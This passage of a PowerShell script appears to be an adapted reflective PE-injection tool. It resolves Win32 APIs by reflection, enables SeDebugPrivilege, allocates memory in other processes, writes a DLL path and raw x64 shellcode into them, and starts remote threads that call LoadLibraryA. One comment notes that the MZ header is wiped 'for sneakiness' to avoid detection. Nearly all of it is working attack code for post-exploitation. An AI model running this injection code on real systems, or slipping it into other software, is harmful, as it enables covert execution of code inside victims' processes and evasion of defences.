        $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
        
        $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
        
        return $Win32Functions
    }
    #####################################

            
    #####################################
    ########### HELPERS ############
    #####################################

    #Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
    #This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
    Function Sub-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                $Val = $Value1Bytes[$i] - $CarryOver
                #Sub bytes
                if ($Val -lt $Value2Bytes[$i])
                {
                    $Val += 256
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
                
                
                [UInt16]$Sum = $Val - $Value2Bytes[$i]

                $FinalBytes[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Add-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                #Add bytes
                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

                $FinalBytes[$i] = $Sum -band 0x00FF
                
                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Compare-Val1GreaterThanVal2AsUInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
            {
                if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
                {
                    return $true
                }
                elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }
        
        return $false
    }
    

    Function Convert-UIntToInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )
        
        [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($ValueBytes, 0))
    }


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
    
    
    Function Test-MemoryRangeValid
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $DebugString,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )
        
        [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
        
        $PEEndAddress = $PEInfo.EndAddress
        
        if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
        {
            Throw "Trying to write to memory smaller than allocated address range. $DebugString"
        }
        if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
        {
            Throw "Trying to write to memory greater than allocated address range. $DebugString"
        }
    }
    
    
    Function Write-BytesToMemory
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,
            
            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $MemoryAddress
        )
    
        for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
        }
    }
    

    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        ################################################################################################
        #                              ADAPTED TO PS7	                                               #
        ################################################################################################
        $AssemblyBuilder = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, 'Run')
        #$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        ################################################################################################
        #                              END ADAPTED TO PS7	                                       #
        ################################################################################################
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }


    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        ################################################################################################
        #                              ADAPTED TO PS7	                                               #
        ################################################################################################
        #$SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            #Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $SystemAssembly=[Reflection.Assembly]::LoadFile('C:\windows\Microsoft.NET\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\system.dll')
        ################################################################################################
        #                              END ADAPTED TO PS7                                              #
        ################################################################################################
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }
    
    
    Function Enable-SeDebugPrivilege
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
        if ($ThreadHandle -eq [IntPtr]::Zero)
        {
            Throw "Unable to get the handle to the current thread"
        }
        
        [IntPtr]$ThreadToken = [IntPtr]::Zero
        [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        if ($Result -eq $false)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
            {
                $Result = $Win32Functions.ImpersonateSelf.Invoke(3)
                if ($Result -eq $false)
                {
                    Throw "Unable to impersonate self"
                }
                
                $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
                if ($Result -eq $false)
                {
                    Throw "Unable to OpenThreadToken."
                }
            }
            else
            {
                Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
            }
        }
        
        [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
        $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
        if ($Result -eq $false)
        {
            Throw "Unable to call LookupPrivilegeValue"
        }

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
        [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
        $TokenPrivileges.PrivilegeCount = 1
        $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
        $TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

        $Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
        if (($Result -eq $false) -or ($ErrorCode -ne 0))
        {
            #Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode" #todo need to detect if already set
        }
        
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
    }
    
    
    Function Create-RemoteThread
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $ProcessHandle,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $ArgumentPtr = [IntPtr]::Zero,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $Win32Functions
        )
        
        [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
        
        $OSVersion = [Environment]::OSVersion.Version
        #Vista and Win7
        if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
        {
            #Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
            $RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($RemoteThreadHandle -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
            }
        }
        #XP/Win8
        else
        {
            #Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
            $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
        }
        
        if ($RemoteThreadHandle -eq [IntPtr]::Zero)
        {
            Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
        }
        
        return $RemoteThreadHandle
    }

    

    Function Get-ImageNtHeaders
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $NtHeadersInfo = New-Object System.Object
        
        #Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
        $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

        #Get IMAGE_NT_HEADERS
        [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
        $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
        $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
        
        #Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
        if ($imageNtHeaders64.Signature -ne 0x00004550)
        {
            throw "Invalid IMAGE_NT_HEADER signature."
        }
        
        if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }
        
        return $NtHeadersInfo
    }


    #This function will get the information needed to allocated space in memory for the PE
    Function Get-PEBasicInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $PEInfo = New-Object System.Object
        
        #Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
        [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
        
        #Get NtHeadersInfo
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
        
        #Build a structure with the information which will be needed for allocating memory and writing the PE to memory
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
        
        #Free the memory allocated above, this isn't where we allocate the PE to memory
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
        
        return $PEInfo
    }


    #PEInfo must contain the following NoteProperties:
    # PEHandle: An IntPtr to the address the PE is loaded to in memory
    Function Get-PEDetailedInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
        }
        
        $PEInfo = New-Object System.Object
        
        #Get NtHeaders information
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
        
        #Build the PEInfo object
        $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
        $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
        $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
        $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        
        if ($PEInfo.PE64Bit -eq $true)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        else
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        
        if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw "PE file is not an EXE or DLL"
        }
        
        return $PEInfo
    }
    
    
    Function Import-DllInRemoteProcess
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $ImportDllPathPtr
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
        $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
        $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($RImportDllPathPtr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }

        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
        
        if ($Success -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($DllPathSize -ne $NumBytesWritten)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }
        
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
        
        [IntPtr]$DllAddress = [IntPtr]::Zero
        #For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
        # Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
        if ($PEInfo.PE64Bit -eq $true)
        {
            #Allocate memory for the address returned by LoadLibraryA
            $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
            }
            
            
            #Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
            $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $LoadLibrarySC2 = @(0x48, 0xba)
            $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
            $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
            
            $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
            $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
            $SCPSMemOriginal = $SCPSMem
            
            Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

            
            $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($RSCAddr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for shellcode"
            }
            
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
            if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
            {
                Throw "Unable to write shellcode to remote process memory."
            }
            
            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            #The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
            [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
            $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
            if ($Result -eq $false)
            {
                Throw "Call to ReadProcessMemory failed"
            }
            [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            [Int32]$ExitCode = 0
            $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
            if (($Result -eq 0) -or ($ExitCode -eq 0))
            {
                Throw "Call to GetExitCodeThread failed"
            }
            
            [IntPtr]$DllAddress = [IntPtr]$ExitCode
        }
        
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        
        return $DllAddress
    }
    
    
    Function Get-RemoteProcAddress
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $RemoteDllHandle,
        
        [Parameter(Position=2, Mandatory=$true)]
        [IntPtr]
        $FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        [IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
            $FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

            #Write FunctionName to memory (will be used in GetProcAddress)
            $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
            $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($RFuncNamePtr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process"
            }

            [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write DLL path to remote process memory"
            }
            if ($FunctionNameSize -ne $NumBytesWritten)
            {
